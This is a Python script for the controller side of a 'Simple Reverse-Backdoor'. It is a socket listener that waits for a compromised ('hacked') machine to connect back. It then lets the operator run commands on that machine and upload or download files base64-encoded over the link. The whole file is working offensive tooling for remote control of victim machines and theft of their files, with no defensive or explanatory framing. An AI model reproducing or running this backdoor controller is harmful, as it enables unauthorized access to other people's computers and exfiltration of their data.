#!/usr/bin/python
import socket
import json
import base64
import sys
import argparse

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # create reusable connection
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print ("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print ("[+] Received a connection from : {}".format(address))

    def reliable_send(self, data):
        '''
        Data Serialization
        '''
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        data = ""
        while True:
            try:
                data = data + self.connection.recv(1024)
                return json.loads(data)
            # check for incomplete data and continue
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        return self.reliable_receive()

    def write_file(self, fpath, content):
        with open(fpath, "wb") as file:
            # useful when sending non utf data such as image and binaries
            file.write(base64.b64decode(content))
            return "[+] Download Succesful"

    def read_file(self, path):
        with open(path, "rb") as file:
            # useful when sending non utf data such as image and binaries
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command_raw = input(">> ")
            command = command_raw.split(" ")
            try:
                # upload given file
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)	
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error".lower() not in result.lower():
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error executing command: {}".format(command_raw)
            print (result)

if __name__ == "__main__":
    parser=argparse.ArgumentParser(description="Simple Reverse-Backdoor listner")
    parser.add_argument("-i","--ip", dest="ip", help="IP address of hacked machine", required=True)
    parser.add_argument("-p","--port", dest="port", type=int, help="port number", required=True)
    options = parser.parse_args()
    my_listener = Listener(options.ip, options.port)
    my_listener.run()